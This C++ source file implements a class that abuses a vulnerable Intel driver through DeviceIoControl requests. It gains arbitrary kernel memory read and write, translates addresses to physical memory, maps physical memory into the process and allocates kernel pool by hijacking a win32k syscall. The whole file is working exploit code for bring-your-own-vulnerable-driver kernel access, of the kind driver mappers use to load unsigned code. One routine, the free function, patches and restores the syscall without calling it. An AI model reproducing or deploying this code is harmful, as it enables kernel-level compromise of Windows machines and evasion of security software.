#include "shittel_driver.h"


#include "kernel_module.h"

namespace kernel::intel
{
	intel_vulnerable_driver::intel_vulnerable_driver() : kernel::vulnerable_driver(driver_device_name)
	{
		if (driver_handle == INVALID_HANDLE_VALUE)
		{
			std::cout << "[-] Failed to open handle to Intel Vulnerable Driver" << std::endl;
		}
		else
		{
			std::cout << "[+] Successfully opened handle to Intel Vulnerable Driver" << std::endl;
		}
	}
	bool intel_vulnerable_driver::driver_read_primitive(uint64_t address, void* buffer, uint64_t buffer_size)
	{
		return intel_copy_memory(reinterpret_cast<uint64_t>(buffer), address, buffer_size);
	}

	bool intel_vulnerable_driver::driver_write_primitive(uint64_t address, void* buffer, uint64_t buffer_size)
	{
		return intel_copy_memory(address, reinterpret_cast<uint64_t>(buffer), buffer_size);
	}

	bool intel_vulnerable_driver::driver_force_write(uint64_t address, void* buffer, uint64_t buffer_size)
	{
		if (address == 0 || buffer == nullptr || buffer_size == 0)
			return false;

		uint64_t physical_address = intel_rva_to_physical(address);

		//std::cout << "kernel function ptr physical " << std::hex << physical_address << std::dec << std::endl;

		if (physical_address == 0)
		{
			std::cerr << "[-] Failed to translate virtual address 0x" << std::hex << address << std::dec << std::endl;
			return false;
		}

		std::cout << "[+] RVA " << std::hex << "0x" << address << " -> Physical Address 0x" << physical_address << std::dec << std::endl;

		//Map our physical memory space into our processes virtual address space
		const uint64_t mapped_physical_address = intel_map_physical(physical_address, buffer_size);

		std::cout << "[+] mapped physical address" << std::hex << "0x" << mapped_physical_address << std::dec << std::endl;

		if (mapped_physical_address == 0)
		{
			std::cerr << "[-] Failed to map physical address 0x" << std::hex << physical_address << std::dec << " into our processes' virtual memory space" << std::endl;
			return false;
		}

		bool success = driver_write_primitive(mapped_physical_address, buffer, buffer_size);

		if (!intel_unmap_physical(mapped_physical_address, buffer_size))
		{
			std::cerr << "[-] Failed to unmap physical address space from virtual memory!" << std::endl;
			return false;
		}

		return success;
	}

	uint64_t intel_vulnerable_driver::allocate_kernel_pool(POOL_TYPE pool_type, uint64_t pool_size)
	{
		if (pool_size == 0) return 0;

		static uint64_t allocate_pool_kernel_addr = 0;

		kernel_module* ntoskrnl = kernel_module::get_kernel_module("ntoskrnl.exe");
		kernel_module* win32u = kernel_module::get_kernel_module("win32kfull.sys");

		if (allocate_pool_kernel_addr == 0)
			allocate_pool_kernel_addr = ntoskrnl->get_module_export(this, "ExAllocatePool");
		uint64_t pool_addr = 0;

		win32u->patch_syscall(this, allocate_pool_kernel_addr);
		{
			using fnExAllocatePool = uint64_t(WINAPI*)(POOL_TYPE, SIZE_T);
			static const auto usermode_addr = reinterpret_cast<void*>(GetProcAddress(LoadLibrary("win32u.dll"), "NtGdiGetCOPPCompatibleOPMInformation"));
			fnExAllocatePool ExAllocatePool = reinterpret_cast<fnExAllocatePool>(usermode_addr);
			pool_addr = ExAllocatePool(pool_type, pool_size);
		}
		win32u->restore_syscall(this);
		return pool_addr;
	}

	bool intel_vulnerable_driver::free_kernel_pool(uint64_t address)
	{
		if (address == 0) return false;

		static uint64_t free_pool_kernel_addr = 0;

		kernel_module* ntoskrnl = kernel_module::get_kernel_module("ntoskrnl.exe");
		kernel_module* win32u = kernel_module::get_kernel_module("win32kfull.sys");

		if (free_pool_kernel_addr == 0)
			free_pool_kernel_addr = ntoskrnl->get_module_export(this, "ExFreePool");

		uint64_t pool_addr = 0;

		win32u->patch_syscall(this, free_pool_kernel_addr);
		win32u->restore_syscall(this);
		//win32u->execute_and_restore_syscall<void>(this, nullptr, address);

		return pool_addr;
	}

	uint64_t intel_vulnerable_driver::intel_map_physical(uint64_t address, uint32_t size)
	{
		if (address == 0 || size == 0)
			return 0;


		MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

		map_io_space_buffer.case_number = 0x19;
		map_io_space_buffer.physical_address_to_map = address;
		map_io_space_buffer.size = size;

		DWORD bytes_returned = 0;

		if (!DeviceIoControl(driver_handle, ioctl::TARGET_ICTL, &map_io_space_buffer, sizeof(MAP_IO_SPACE_BUFFER_INFO), nullptr, 0, &bytes_returned, 0))
			return 0;

		return map_io_space_buffer.return_virtual_address;
	}

	bool intel_vulnerable_driver::intel_unmap_physical(uint64_t address, uint32_t size)
	{
		if (address == 0 || size == 0)
			return false;

		UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

		unmap_io_space_buffer.case_number = 0x1A;
		unmap_io_space_buffer.virt_address = address;
		unmap_io_space_buffer.number_of_bytes = size;

		DWORD bytes_returned = 0;

		return DeviceIoControl(driver_handle, ioctl::TARGET_ICTL, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, 0);

	}

	uint64_t intel_vulnerable_driver::intel_rva_to_physical(uint64_t address)
	{
		GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

		get_phys_address_buffer.case_number = 0x25;
		get_phys_address_buffer.address_to_translate = address;

		DWORD bytes_read = 0;

		if (!DeviceIoControl(driver_handle, ioctl::TARGET_ICTL, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_read, nullptr))
			return 0x0;

		return get_phys_address_buffer.return_physical_address;
	}

	bool intel_vulnerable_driver::intel_copy_memory(uint64_t destination, uint64_t source, uint64_t size)
	{
		COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

		copy_memory_buffer.case_number = 0x33;
		copy_memory_buffer.source = source;
		copy_memory_buffer.destination = destination;
		copy_memory_buffer.length = size;

		DWORD bytes_returned = 0;

		return DeviceIoControl(driver_handle, ioctl::TARGET_ICTL, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
	}
}
